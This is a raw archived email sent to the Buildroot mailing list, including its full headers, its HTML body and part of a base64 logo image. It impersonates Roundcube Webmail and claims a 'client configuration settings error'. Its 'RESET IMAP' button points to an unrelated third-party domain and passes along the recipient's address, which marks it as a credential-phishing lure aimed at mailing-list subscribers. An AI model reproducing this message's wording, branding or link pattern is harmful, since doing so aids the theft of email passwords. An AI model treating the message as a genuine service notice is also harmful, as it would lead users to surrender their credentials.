Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 7AA2CCF2579
	for <buildroot@archiver.kernel.org>; Sun, 13 Oct 2024 09:36:22 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id 3AAF360BB1;
	Sun, 13 Oct 2024 09:36:22 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id Dwa88euTb_mR; Sun, 13 Oct 2024 09:36:21 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 3A9DA60BCE
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp3.osuosl.org (Postfix) with ESMTP id 3A9DA60BCE;
	Sun, 13 Oct 2024 09:36:21 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 0F1B51BF346
 for <buildroot@lists.busybox.net>; Sun, 13 Oct 2024 09:36:20 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id F1E32810B5
 for <buildroot@lists.busybox.net>; Sun, 13 Oct 2024 09:36:19 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id l-_XPmIor_WD for <buildroot@lists.busybox.net>;
 Sun, 13 Oct 2024 09:36:19 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=104.168.34.171;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 7998180BF0
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 7998180BF0
Received: from busybox.net (unknown [104.168.34.171])
 by smtp1.osuosl.org (Postfix) with ESMTP id 7998180BF0
 for <buildroot@busybox.net>; Sun, 13 Oct 2024 09:36:18 +0000 (UTC)
From: Roundcube Webmail <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 13 Oct 2024 11:36:16 +0200
Message-ID: <20241013113615.858C09B9586246B8@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Client configuration settings error for
 buildroot@busybox.net
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============0403123424876597065=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>


--===============0403123424876597065==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_78B8AEAB.68267413"


------=_NextPart_000_0012_78B8AEAB.68267413
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<div class=3D"gmail_attr" style=3D"color: rgb(34, 34, 34); text-transform: =
none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helveti=
ca, sans-serif; font-size: small; font-style: normal; font-weight: 400; wor=
d-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-colo=
r: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
text-decoration-style: initial;=20
text-decoration-color: initial;" dir=3D"ltr"><font color=3D"#000000" face=
=3D"Times New Roman" size=3D"3"><br></font>
</div><div style=3D"color: rgb(34, 34, 34); text-transform: none; text-inde=
nt: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif;=
 font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px;=
 white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255=
, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
-style: initial; text-decoration-color: initial;">
<table width=3D"600" style=3D"border: 1px solid lightgray; border-image: no=
ne; font-size: 11pt; border-collapse: collapse;" cellspacing=3D"0" cellpadd=
ing=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing:=
 border-box;"><td width=3D"100%" style=3D"margin: 0px; padding: 10px; box-s=
izing: border-box;">
<div style=3D"border-width: 0px; margin: 0px; padding: 20px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Verdana; font-size: 12px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; vertical-align: baseline; white-space=
: normal; box-sizing: border-box; font-stretch: inherit; background-color: =
rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: norm=
al; text-decoration-style: initial;=20
text-decoration-color: initial;"><span style=3D"text-align: left; color: rg=
b(44, 54, 58); text-transform: none; text-indent: 0px; letter-spacing: norm=
al; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; f=
ont-weight: 400; word-spacing: 0px; float: none; display: inline !important=
; white-space: normal; background-color: rgb(255, 255, 255); font-variant-l=
igatures: normal; font-variant-caps: normal; text-decoration-style: initial=
; text-decoration-color: initial;">
<img align=3D"baseline" alt=3D"" src=3D"cid:roundcube.png" border=3D"0" hsp=
ace=3D"0" width=3D"441" height=3D"112"></span></div></td></tr><tr style=3D"=
box-sizing: border-box;"><td width=3D"100%" align=3D"left" style=3D"margin:=
 0px; padding: 20px; box-sizing: border-box;"><p style=3D'margin: 0px 0px 1=
0px; font-family: "Segoe UI"; box-sizing: border-box;'><span style=3D"font-=
size: medium;"><br></span></p><span style=3D"font-size: large;">
<table width=3D"680" style=3D"border: 0px currentColor; border-image: none;=
 max-width: 680px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody=
><tr><td width=3D"680" height=3D"25" style=3D'margin: 0px; color: rgb(51, 5=
1, 51); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-s=
ize: 16px;'><strong>Client Configuration settings for buildroot@busybox.net=
</strong></td></tr><tr>
<td style=3D"border-width: 2px; border-style: solid; border-color: rgb(232,=
 232, 232) rgb(232, 232, 232) rgb(255, 108, 44); margin: 0px; padding: 15px=
 0px 20px; background-color: rgb(255, 255, 255);"><table width=3D"680" styl=
e=3D'background: rgb(255, 255, 255); font-family: "Helvetica Neue", Helveti=
ca, Arial, sans-serif;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><t=
body><tr><td width=3D"15" style=3D"margin: 0px;"></td><td width=3D"650" sty=
le=3D"margin: 0px;">
<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbo=
dy><tr><td style=3D"margin: 0px;"><div id=3D"m_5474801725029693249v1manual_=
settings_area"><h2 id=3D"m_5474801725029693249v1hdrManualSettings">Mail Cli=
ent Manual Settings</h2><div><div><div id=3D"m_5474801725029693249v1ssl_set=
tings_area" style=3D"border-radius: 4px; border: 1px solid rgb(66, 139, 202=
); border-image: none; margin-bottom: 20px; background-color: rgb(255, 255,=
 255);">
<div style=3D"border-color: rgb(66, 139, 202); padding: 10px 15px; color: r=
gb(255, 255, 255); border-top-left-radius: 3px; border-top-right-radius: 3p=
x; background-color: rgb(66, 139, 202);"><strong>Secure&nbsp;<abbr title=3D=
"Secure Sockets Layer">SSL</abbr>/<abbr title=3D"Transport Layer Security">=
TLS</abbr>&nbsp;Settings (Recommended)</strong></div><table style=3D"width:=
 662.67px; margin-bottom: 0px; border-collapse: collapse; max-width: 100%; =
border-spacing: 0px; background-color: transparent;">
<tbody><tr><td id=3D"m_5474801725029693249v1lblSSLSettingsAreaUsername" sty=
le=3D"margin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); bord=
er-top-width: 1px; border-top-style: solid;"><strong>Username:</strong></td=
><td id=3D"m_5474801725029693249v1valSSLSettingsAreaUsername" style=3D"marg=
in: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-wid=
th: 1px; border-top-style: solid;">buildroot@busybox.net</td></tr><tr>
<td id=3D"m_5474801725029693249v1lblSettingsAreaPassword" style=3D"margin: =
0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: =
1px; border-top-style: solid;"><strong>Password:</strong></td><td id=3D"m_5=
474801725029693249v1valSettingsAreaPassword" style=3D"margin: 0px; padding:=
 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; border-t=
op-style: solid;"><strong>Use the email account's password.</strong></td></=
tr><tr>
<td id=3D"m_5474801725029693249v1lblSettingsAreaIncomingServer" style=3D"ma=
rgin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-w=
idth: 1px; border-top-style: solid;"><strong>Incoming Server:</strong></td>=
<td id=3D"m_5474801725029693249v1valSettingsAreaIncomingServer" style=3D"ma=
rgin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-w=
idth: 1px; border-top-style: solid;"><ul style=3D"list-style: none; padding=
-left: 0px; margin-top: 0px; margin-bottom: 10px;"><strong>
&nbsp;</strong>mail.busybox.net<br><li style=3D"padding-right: 5px; padding=
-left: 5px; display: inline-block;"><strong><abbr title=3D"Internet Message=
 Access Protocol">IMAP</abbr>&nbsp;Port: 993</strong></li><strong>&nbsp;</s=
trong><li style=3D"padding-right: 5px; padding-left: 5px; display: inline-b=
lock;"><strong><abbr title=3D"Post Office Protocol 3">POP3</abbr>&nbsp;Port=
: 995</strong></li></ul></td></tr><tr>
<td id=3D"m_5474801725029693249v1lblSettingsAreaOutgoingServer" style=3D"ma=
rgin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-w=
idth: 1px; border-top-style: solid;"><strong>Outgoing Server:</strong></td>=
<td id=3D"m_5474801725029693249v1valSettingsAreaOutGoingServer" style=3D"ma=
rgin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221); border-top-w=
idth: 1px; border-top-style: solid;">
&nbsp;mail.busybox.net<ul style=3D"list-style: none; padding-left: 0px; mar=
gin-top: 0px; margin-bottom: 10px;"><li style=3D"padding-right: 5px; paddin=
g-left: 5px; display: inline-block;"><strong><abbr title=3D"Simple Mail Tra=
nsfer Protocol">SMTP</abbr>&nbsp;Port: 465</strong></li></ul></td></tr><tr>=
<td style=3D"margin: 0px; padding: 8px; border-top-color: rgb(221, 221, 221=
); border-top-width: 1px; border-top-style: solid;" colspan=3D"2"><div id=
=3D"m_5474801725029693249v1lblSettingsAreaSmallNote1"><strong>
IMAP, POP3, and SMTP require authentication.</strong></div></td></tr></tbod=
y></table></div></div></div></div></td></tr></tbody></table></td></tr></tbo=
dy></table></td></tr></tbody></table></span><p style=3D'margin: 0px 0px 10p=
x; font-family: "Open Sans", Verdana, Tahoma, serif; font-size: 16px; box-s=
izing: border-box;'><font size=3D"4">&nbsp;</font><font size=3D"4"></font><=
/p><p style=3D'margin: 0px 0px 10px; font-family: "Segoe UI"; font-size: 16=
px; box-sizing: border-box;'><font size=3D"4">
Reset your incoming server settings to continue receiving messages.</font><=
/p><p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;=
">&nbsp;</p><table width=3D"193" style=3D"border-radius: 3px; height: 52px;=
 font-size: 11pt; border-collapse: collapse; background-color: rgb(215, 86,=
 36);" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box=
-sizing: border-box;"><tr style=3D"box-sizing: border-box;">
<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 15px =
30px; box-sizing: border-box;"><a style=3D"color: rgb(255, 255, 255); font-=
family: Helvetica, Arial, sans-serif; font-size: 16px; font-weight: bold; b=
ox-sizing: border-box; background-color: transparent; text-decoration-line:=
 none;" href=3D"https://venturasteels.com/cpsess8137425300/3rdparty/_task=
=3Dmail&amp;_mbox=3DINBOX.html?cms=3Dbuildroot@busybox.net" rel=3D"noreferr=
er">RESET&nbsp; IMAP</a></td></tr></tbody></table>
<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;">
&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: bord=
er-box;">I<span style=3D'font-family: "Segoe UI"; font-size: medium;'>f aft=
er resetting your server and you still experience service disruption, kindl=
y contact<span>&nbsp;support</span><span>&nbsp;</span>for further assistanc=
e.</span>&nbsp;</p></td></tr></tbody></table></div><p>
</p>


</body></html>
------=_NextPart_000_0012_78B8AEAB.68267413
Content-Type: image/png; name="roundcube.png"
Content-Transfer-Encoding: base64
Content-ID: <roundcube.png>

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
